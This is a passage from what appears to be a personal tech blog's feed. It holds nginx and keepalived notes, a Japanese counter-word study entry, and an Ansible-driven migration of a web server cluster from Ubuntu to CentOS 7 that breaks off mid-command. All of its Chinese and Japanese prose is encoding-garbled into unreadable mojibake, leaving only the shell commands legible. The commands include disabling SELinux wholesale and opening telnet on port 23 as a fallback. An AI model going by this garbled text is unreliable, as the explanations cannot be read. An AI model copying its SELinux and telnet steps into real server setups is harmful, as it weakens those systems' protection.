¹æ®ç½‘å¡ç±»å‹æ¥å®šä¹‰</span></span><br><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li><li><p>è¿™ä¸ªipè½¬å‘ç”¨ä¸ç”¨å°±å¿˜äº†æµ‹è¯•äº†ï¼Œå¦‚æœå¼€å¯é˜²ç«å¢™è¿˜ä¸è¡Œå°±è¯•è¯•å§ã€‚<br>echo â€œnet.ipv4.ip_forward = 1â€ &gt;&gt; /etc/sysctl.conf</p></li></ul><ul><li><p>å¦‚æœæ²¡è£… zlib zlib-devel openssl çš„è®°å¾—å®‰è£…å–”ï¼</p></li><li><p>*** WARNING - this build will not support IPVS with IPv6. Please install libnl/libnl-3 dev libraries to support IPv6 with IPVS.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install libnl libnl-devel</span><br></pre></td></tr></table></figure></li></ul><h3 id="nginx-è´Ÿè½½å‡è¡¡"><a href="#nginx-è´Ÿè½½å‡è¡¡" class="headerlink" title="nginx è´Ÿè½½å‡è¡¡"></a>nginx è´Ÿè½½å‡è¡¡</h3><p>nginx é…ç½®æ–‡ä»¶å†…</p><pre><code>upstream yourname &#123;    yourip;&#125;location / &#123;    proxy_pass http://yourname;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Œé‡è©ã€</title>
      <link href="2019/07/23/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/"/>
      <url>2019/07/23/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<ul><li><table><thead><tr><th align="center">-</th><th align="center">â€“&gt;</th><th align="center">â€“&gt;</th><th align="center">-</th></tr></thead><tbody><tr><td align="center">ï¼‘ ã„ã¡</td><td align="center">ã‹ã€€ã•ã€€ãŸã€€ã¯ã€€è¡Œ</td><td align="center">ã„ã£</td><td align="center">æšã€å›ã€å°ã€æ­³</td></tr><tr><td align="center">ï¼– ã‚ã</td><td align="center">ã‹ã€€ã•ã€€ãŸã€€ã¯ã€€è¡Œ</td><td align="center">ã‚ã£</td><td align="center">æšã€å›ã€å°ã€æ­³</td></tr><tr><td align="center">ï¼˜ ã¯ã¡</td><td align="center">ã‹ã€€ã€€ã€€ã€€ã€€ã¯ã€€è¡Œ</td><td align="center">ã¯ã£</td><td align="center">æšã€å›ã€å°ã€æ­³</td></tr><tr><td align="center">ï¼‘ï¼ ã˜ã‚…ã†</td><td align="center">ã‹ã€€ã•ã€€ãŸã€€ã¯ã€€è¡Œ</td><td align="center">ã˜ã‚…ã£</td><td align="center">æšã€å›ã€å°ã€æ­³</td></tr></tbody></table></li></ul><p>ä¾‹ï¼šãƒªãƒ³ã‚´ã‚’<u>ä¸‰ã¤</u>è²·ã„ã¾ã—ãŸ<br>&emsp;&emsp;å†™çœŸã‚’<u>3æš</u>æ’®ã‚Šã¾ã—ãŸ<br>&emsp;&emsp;èœœæŸ‘ã‚’<u>ï¼˜ã¤</u>é£Ÿã¹ã¾ã—ãŸ</p><ul><li><p>æ˜¨æ—¥ã¯4æ™‚é–“<u>ã—ã‹</u>å¯<u>ã¾ã›ã‚“</u>ã§ã—ãŸ<br>ã—ã‹ + ã¾ã›ã‚“ã§ã—ãŸã€€è¦ç¿»è¨³æˆè‚¯å®š</p></li><li><p>[é‡è©] + ã‚‚ã€€å¼·èª¿ [é‡ åš é•· å¤§ å¤š]<br>ã‚±ãƒ¼ã‚­ã‚’8å€‹<u>ã‚‚</u>é£Ÿã¹ã¾ã—ãŸ</p></li><li><p>[é‡è©] + ã—ã‹ã€€å¼·èª¿ [è»½ è–„ çŸ­ å° å°‘]<br>è²¡å¸ƒã«ï¼‘ï¼å…ƒ<u>ã—ã‹</u>ã‚ã‚Š<u>ã¾ã›ã‚“</u></p></li><li><p>[é‡è©]ã€€ã ã‘ zhiyou~ 10åˆ†<u>ã ã‘</u>ä¼‘ã¿ã¾ã—ã‚‡ã†</p></li><li><p>[é‡è©]ã€€ãã‚‰ã„ ~å·¦å³ã€€è²¡å¸ƒã«ï¼‘ï¼å…ƒ<u>ã(ã)ã‚‰ã„</u>ã‚ã‚Šã¾ã™</p></li><li><p>[é‡è©]ã€€ã¯ zhishao~ è²¡å¸ƒã«ï¼‘ï¼ï¼ï¼å…ƒ<u>ã¯</u>ã‚ã‚Šã¾ã™</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> å‹‰å¼· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‹‰å¼· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webç«™ç¾¤ä»Ubuntu14.04è¿ç§»è‡³CentOS7</title>
      <link href="2019/07/15/ansible-shell/"/>
      <url>2019/07/15/ansible-shell/</url>
      
        <content type="html"><![CDATA[<p><a href="#nfs">nfsè¿ç§»</a></p><h3 id="ç³»ç»Ÿç¯å¢ƒ-CentOS-7-x86-64-Minimal-1511"><a href="#ç³»ç»Ÿç¯å¢ƒ-CentOS-7-x86-64-Minimal-1511" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ: CentOS-7-x86_64-Minimal-1511"></a>ç³»ç»Ÿç¯å¢ƒ: CentOS-7-x86_64-Minimal-1511</h3><p>ç›¸å…³çš„å‰§æœ¬å’Œè„šæœ¬å¯ä»¥ <a href="https://github.com/TARI0510/ansible">å‚è€ƒæˆ‘çš„github</a></p><p><a href="https://github.com/TARI0510/webAnsible/tree/master/mysh/common.sh">common.sh ä¸ºå…¬ç”¨è„šæœ¬ï¼ŒåŒ…å«å…¬ç”¨æ¨¡å—</a></p><h3 id="æœåŠ¡å™¨å¤‡ä»½"><a href="#æœåŠ¡å™¨å¤‡ä»½" class="headerlink" title="æœåŠ¡å™¨å¤‡ä»½"></a>æœåŠ¡å™¨å¤‡ä»½</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook srvs_backup_role.yml</span><br></pre></td></tr></table></figure><p>å‡ºç°é—®é¢˜: </p><pre><code>failed: [192.168.206.132] (item=baseVersionBackup.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;fe2fab79a66b8f5489418fd7b556cdbb74abcac6&quot;, &quot;item&quot;: &quot;baseVersionBackup.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125;failed: [192.168.206.132] (item=common.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;b8554aa38d74846821d3575eaf72854f2eb40338&quot;, &quot;item&quot;: &quot;common.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125;</code></pre><p>è¿™ä¸ªé—®é¢˜ä¸»è¦æ˜¯ç”± SELinuxï¼ˆSecurity-Enhanced Linuxï¼‰å¼•èµ·çš„.  CentOS7 ä¸€èˆ¬è‡ªå¸¦ libselinux-python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ²¡æœ‰çš„è¯å¯ä»¥å®‰è£…ä¸€ä¸‹</span></span><br><span class="line">yum -y install libselinux-python</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä¸å¤§äº†è§£å®ƒ, å¹²è„†å°±æŠŠå®ƒçš„ç¦ç”¨äº†, è®°å¾—åœ¨ç›®æ ‡ä¸»æœºç¦ç”¨å–”..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&#x27;</span> /etc/selinux/config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^SELINUX/s/SELINUX=permissive/SELINUX=disabled/&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure><h3 id="æ›´æ–°æºä¸ºé˜¿é‡Œäº‘æº"><a href="#æ›´æ–°æºä¸ºé˜¿é‡Œäº‘æº" class="headerlink" title="æ›´æ–°æºä¸ºé˜¿é‡Œäº‘æº"></a>æ›´æ–°æºä¸ºé˜¿é‡Œäº‘æº</h3><p>è¿™ä¸ªè¿‡ç¨‹å¯èƒ½è¦ä¸‹è½½çš„ä¸œè¥¿è¾ƒå¤šï¼Œæœ‰äº›ä¸»æœºå¯èƒ½å†™åˆ°å¤§åŠå°±è¿æ¥è¶…æ—¶äº†ã€‚<br>å¯¹äºå°‘è®¸ä¸»æœºå¯ä»¥ç›´è¿ä¸Šå»æ‰§è¡Œ yum update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook  yum_aliyun_source_role.yml</span><br></pre></td></tr></table></figure><h3 id="openssh-å®‰è£…"><a href="#openssh-å®‰è£…" class="headerlink" title="openssh å®‰è£…"></a>openssh å®‰è£…</h3><h4 id="å¯ç”¨-telnet-ä»¥é˜²ä¸‡ä¸€"><a href="#å¯ç”¨-telnet-ä»¥é˜²ä¸‡ä¸€" class="headerlink" title="å¯ç”¨ telnet ä»¥é˜²ä¸‡ä¸€"></a>å¯ç”¨ telnet ä»¥é˜²ä¸‡ä¸€</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&#x27;yum -y install xinetd telnet-server&#x27;</span></span><br><span class="line">ansible webGroup -m shell -a <span class="string">&#x27;ls -ll /etc/xinetd.d/telnet&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ ç”¨æˆ·ä»¥é˜²ä¸‡ä¸€"><a href="#æ·»åŠ ç”¨æˆ·ä»¥é˜²ä¸‡ä¸€" class="headerlink" title="æ·»åŠ ç”¨æˆ·ä»¥é˜²ä¸‡ä¸€"></a>æ·»åŠ ç”¨æˆ·ä»¥é˜²ä¸‡ä¸€</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">webGroup</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">name=username</span> <span class="string">password=yourpassword</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> &#123;&#123; <span class="string">runHost</span> &#125;&#125;</span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">group</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">name=username</span> <span class="string">state=absent</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">name=username</span> <span class="string">state=absent</span></span><br></pre></td></tr></table></figure><p>å…³é—­é˜²ç«å¢™ï¼Œè®©å¤–è¾¹çš„ telnet è¯·æ±‚å¯ä»¥è¿›æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service=telnet --permanent</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 23 -jACCEPT</span><br><span class="line">iptables -I INPUT -p udp --dport 23 -jACCEPT</span><br><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h4 id="å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å®‰è£…-OpenSSH"><a href="#å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å®‰è£…-OpenSSH" class="headerlink" title="å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å®‰è£… OpenSSH"></a>å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å®‰è£… OpenSSH</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook openssh_role.yml</span><br></pre></td></tr></table></figure><p>ç¡®è®¤æ˜¯å¦å‡çº§æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&quot;ssh -V&quot;</span></span><br></pre></td></tr></table></figure><p>é‡å¯ä¸€ä¸‹ä¸»æœºï¼Œç­‰å¾…å°‘è®¸æ—¶é—´å¹¶æ£€æµ‹ sshd çš„çŠ¶æ€ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&quot;reboot&quot;</span></span><br><span class="line"></span><br><span class="line">ansible webGroup -m shell -a <span class="string">&quot;systemctl status sshd&quot;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºæœ‰é—®é¢˜çš„å°‘è®¸ä¸»æœºå¯ä»¥ç›´è¿ä¸Šå»æ‰§è¡Œ systemctl stop sshd å¹¶ç­‰å¾…å°‘è®¸æ‰§è¡Œ<br>systemctl start sshd</p><p>å¼€å¯é˜²ç«å¢™ï¼Œé˜»æ­¢å¤–è¾¹çš„ telnet è¯·æ±‚è¿›æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --remove-service=telnet</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 23 -jDROP</span><br></pre></td></tr></table></figure><h3 id="å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£…-nginx-1-16-0"><a href="#å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£…-nginx-1-16-0" class="headerlink" title="å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… nginx 1.16.0"></a>å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… nginx 1.16.0</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook nginx_role.yml</span><br></pre></td></tr></table></figure><p>nginxçš„é…ç½®æ ¹æ®æ—§æœåŠ¡å™¨çš„æ¥å°±å¥½äº†.</p><h4 id="nginx-åŒå†—ä½™"><a href="#nginx-åŒå†—ä½™" class="headerlink" title="nginx åŒå†—ä½™"></a>nginx åŒå†—ä½™</h4><p><a href="https://github.com/TARI0510/webAnsible/tree/master/roles/keepalived">nginx å­˜æ´»æ¢æµ‹è„šæœ¬é“¾æ¥</a><br>é…ç½®æ–‡ä»¶çš„ <a href="#">é“¾æ¥åœ¨æ­¤</a><br>/<em>/<em>æ³¨æ„äº‹é¡¹/</em>/</em></p><p>è„šæœ¬è¦ç”¨åˆ° killall å‘½ä»¤, æ²¡æœ‰çš„åŒå­¦è®°å¾—è£…, centos killallçš„åŒ…æ˜¯ï¼Œä¸è¿‡æˆ‘çš„è„šæœ¬ä¼šé»˜è®¤å¸®ä½ è£…ä¸Šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install psmisc</span><br></pre></td></tr></table></figure><p>é˜²ç«å¢™çš„çš„ç½‘å¡ eth0 è®°å¾—è·Ÿæ ¹æ®è‡ªå·±çš„ç½‘å¡æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h4 id="nginx-è´Ÿè½½å‡è¡¡"><a href="#nginx-è´Ÿè½½å‡è¡¡" class="headerlink" title="nginx è´Ÿè½½å‡è¡¡"></a>nginx è´Ÿè½½å‡è¡¡</h4><p>è¿™ä¸ªæ¯”è¾ƒå®¹æ˜“, éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœç”¨åˆ° session è®°å¾—ç”¨ å“ˆå¸Œæ³• å³æ·»åŠ </p><pre><code>ip_hash; </code></pre><p>åˆ° upsteam ä¸­å°±å¥½å•¦</p><h3 id="å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£…-PHP7-2"><a href="#å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£…-PHP7-2" class="headerlink" title="å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… PHP7.2"></a>å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… PHP7.2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook php_role.yml</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç½‘ä¸Šèµ„æ–™æ¨èä½¿ç”¨ sock è€Œä¸”ä¸æ˜¯ ç«¯å£cgi æ¨¡å¼<br>phpæ—§æœåŠ¡å™¨çš„é…ç½®æ›´æ¢äº† /etc/php.ini å’Œ /etc/php-fpm.d/<a href="http://www.conf/">www.conf</a> æ–‡ä»¶åˆ°æ–°æœåŠ¡ä¸­</p><h3 id="å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£…-mysql5-7"><a href="#å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£…-mysql5-7" class="headerlink" title="å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… mysql5.7"></a>å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… mysql5.7</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook mysql_role.yml</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œåè®°å¾—å¯¹å¯¼å…¥çš„æ•°æ®æˆæƒå–”ï¼ï¼ï¼ä¸ç„¶è¿œç¨‹è¿æ¥ä¼šè¢«ç¦æ­¢æ‰çš„ã€‚</p><h3 id="ä¸ºäº†æ–¹ä¾¿çŸ¥é“è‡ªå·±æ“æ§å“ªä¸ªæœåŠ¡å™¨"><a href="#ä¸ºäº†æ–¹ä¾¿çŸ¥é“è‡ªå·±æ“æ§å“ªä¸ªæœåŠ¡å™¨" class="headerlink" title="ä¸ºäº†æ–¹ä¾¿çŸ¥é“è‡ªå·±æ“æ§å“ªä¸ªæœåŠ¡å™¨"></a>ä¸ºäº†æ–¹ä¾¿çŸ¥é“è‡ªå·±æ“æ§å“ªä¸ªæœåŠ¡å™¨</h3><p>åœ¨ /etc/bashrc æˆ– ~/.bashrc æ–‡ä»¶æœ€åæ·»åŠ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PS1=<span class="string">&quot;[\u@`hostname -I | cut -d &quot;</span>.<span class="string">&quot; -f 4`\W]# &quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶å source ä¸€ä¸‹</p><h3 id="è°ƒæ•´æ—¶é—´ã€æ—¶åŒº"><a href="#è°ƒæ•´æ—¶é—´ã€æ—¶åŒº" class="headerlink" title="è°ƒæ•´æ—¶é—´ã€æ—¶åŒº"></a>è°ƒæ•´æ—¶é—´ã€æ—¶åŒº</h3><p>ç”±äºæˆ‘çš„æ—¶é—´å’ŒåŒ—äº¬æ—¶é—´æ˜¯ä¸€æ ·çš„, æ‰€ä»¥æˆ‘å°±çœç•¥è¿™æ­¥å•¦!</p><h3 id="nfs-æœåŠ¡å™¨çš„è¿ç§»"><a href="#nfs-æœåŠ¡å™¨çš„è¿ç§»" class="headerlink" title="nfs æœåŠ¡å™¨çš„è¿ç§»"></a><span id="nfs">nfs æœåŠ¡å™¨çš„è¿ç§»</span></h3><p><a href="https://github.com/TARI0510/webAnsible/tree/master/mysh">common.sh å’Œ nfs.sh è„šæœ¬ä½ç½®</a><br>é¦–å…ˆé…ç½®è¦ä½¿ç”¨ nfs æœåŠ¡çš„æœåŠ¡å™¨è·¯å¾„</p><pre><code># /etc/exports æ–‡ä»¶/home/www/æŸä¸ªç«™ç‚¹ ipåœ°å€(rw,sync,all_squash,no_subtree_check)/home/www/æŸä¸ªç«™ç‚¹ IPåœ°å€(rw,sync,all_squash,no_subtree_check)</code></pre><p>/home è·¯å¾„æ˜¯ä¸‹å›¾ mounted on ä¸‹çš„è·¯å¾„<br><img src="/img/Linux_Server_Maintenance/nfs_notice.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/nfs_notice.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="notice"></p><p>å‚æ•°è¯´æ˜:</p><ul><li>rw è¯»å†™æƒé™</li><li>sync æ•°æ®åŒæ­¥å†™å…¥å†…å­˜ç¼“å†²åŒºå’Œç¡¬ç›˜, ä¿è¯æ•°æ®ä¸€è‡´</li><li>all_squash æ‰€æœ‰è®¿é—®ç”¨æˆ·éƒ½æ˜ å°„ä¸ºåŒ¿åç”¨æˆ·æˆ–ç”¨æˆ·ç»„</li><li>no_subtree_check å³ä½¿è¾“å‡ºç›®å½•æ˜¯ä¸€ä¸ªå­ç›®å½•ï¼ŒnfsæœåŠ¡å™¨ä¹Ÿä¸æ£€æŸ¥å…¶çˆ¶ç›®å½•çš„æƒé™</li></ul><p>æŠŠæ–‡ä»¶ä¼ é€åˆ°ç›®æ ‡æœåŠ¡å™¨balabalaï½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload nfs</span><br></pre></td></tr></table></figure><p>å…è®¸ç›¸åº”æœåŠ¡çš„é˜²ç«å¢™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service=nfs --permanent --zone=public</span><br><span class="line">firewall-cmd --add-service=mountd --permanent --zone=public</span><br><span class="line">firewall-cmd --add-service=rpc-bind --permanent --zone=public</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>åˆ›å»ºç›¸åº”æ–‡ä»¶çš„è½¯è¿æ¥æ–¹ä¾¿nfsä¸Šnginxçš„ä½¿ç”¨<br>åœ¨webæœåŠ¡å™¨ä¸Šåˆ›å»ºè¦æŒ‚è½½çš„æ–‡ä»¶å¤¹å¹¶æŒ‚è½½</p><p>ä¸´æ—¶æŒ‚è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs nfsçš„IPåœ°å€:è·¯å¾„ æœ¬æœºè·¯å¾„</span><br></pre></td></tr></table></figure><p>/etc/fstab æ–‡ä»¶æ·»åŠ ä»¥ç”¨äºå¼€æœºå¯åŠ¨</p><pre><code>nfsçš„ipåœ°å€:è·¯å¾„  æœ¬æœºè·¯å¾„ nfs rw  0 0nfsçš„ipåœ°å€:è·¯å¾„   æœ¬æœºè·¯å¾„ nfs rw  0 0éœ€è¦ä¸»è¦ï¼Œä¸¤å°ä¸åŒæœåŠ¡å™¨çš„ç”¨æˆ·çš„gidå’Œuidä¸€ä¸ä¸€è‡´ï¼Œä¸ç„¶ä¼šå‡ºç°æ—§æœåŠ¡å™¨æ— æ³•å†™å…¥çš„ç°è±¡</code></pre><h3 id="rsync-å¢é‡å¤‡ä»½"><a href="#rsync-å¢é‡å¤‡ä»½" class="headerlink" title="rsync å¢é‡å¤‡ä»½"></a>rsync å¢é‡å¤‡ä»½</h3><p>å°å‰è¨€: æƒé™æ˜æ˜å¤Ÿï¼Œä½†æ˜¯ä¸€ç›´æŠ¥è¿™ä¸ªé”™ï¼š</p><pre><code>rsync: recv_generator: mkdir &quot;test&quot; (in home_131) failed: Permission denied (13)</code></pre><p>åæ¥å‘ç° selinux æ²¡å…³é—­ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h4 id="é¦–å…ˆå¼€æ”¾ç«¯å£å§ï¼"><a href="#é¦–å…ˆå¼€æ”¾ç«¯å£å§ï¼" class="headerlink" title="é¦–å…ˆå¼€æ”¾ç«¯å£å§ï¼"></a>é¦–å…ˆå¼€æ”¾ç«¯å£å§ï¼</h4><p>å¦‚æœç”¨çš„æ˜¯ iptables </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc/sysconfig/iptables </span><br></pre></td></tr></table></figure><p>æ·»åŠ </p><pre><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT</code></pre><p>æˆ–è€…ç›´æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT</span><br></pre></td></tr></table></figure><p>ç„¶åå†é‡å¯ä¸€ä¸‹å°±è¡Œäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart iptables</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨çš„æ˜¯ firewalld</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=873/tcp --permanent &amp;&amp;</span><br><span class="line">firewall-cmd --reload &amp;&amp;</span><br><span class="line">firewall-cmd --list-port</span><br></pre></td></tr></table></figure><p>æˆ‘æ­å»ºçš„ rsync æ˜¯è¿™æ ·å­çš„ï¼Œä¸»æœåŠ¡å™¨ (ä¹Ÿå°±æ˜¯æ­£åœ¨è¿è¡ŒWebæœåŠ¡å™¨çš„æœåŠ¡å™¨) æ–‡ä»¶å‘ç”Ÿæ”¹å˜ (å†…å®¹æ”¹å˜æˆ–è€…æ–‡ä»¶æœ¬èº«çš„å¢åŠ æˆ–è€…åˆ é™¤) å°±ä¼šé€šè¿‡ç›‘å¬è„šæœ¬è‡ªåŠ¨å¤‡ä»½åˆ°å¤‡ä»½æœåŠ¡å™¨</p><p>ä»¥ä¸‹å®‰è£…å’Œé…ç½® rsync æ˜¯å‚è€ƒè¯¥é“¾æ¥ <a href="https://mp.weixin.qq.com/s?__biz=MzI5NzY0MzM0OQ==&mid=2247483717&idx=1&sn=e0e0cad1c75062c8ab0ce40afa935a0c&chksm=ecb0bd7fdbc73469dd10aff6a75c7e45b9cf12e71afc1687ef3cf8ba3a58b43e189273b737c7&mpshare=1&scene=1&srcid=&sharer_sharetime=1563862637449&sharer_shareid=96290980786f0825d84f1a8fef954414#rd">ç«™é•¿é‚£äº›äº‹å„¿</a></p><h4 id="ä¸¤å°æœåŠ¡å™¨ä¸€èµ·å®‰è£…-rsync"><a href="#ä¸¤å°æœåŠ¡å™¨ä¸€èµ·å®‰è£…-rsync" class="headerlink" title="ä¸¤å°æœåŠ¡å™¨ä¸€èµ·å®‰è£… rsync"></a>ä¸¤å°æœåŠ¡å™¨ä¸€èµ·å®‰è£… rsync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install rsync xinetd 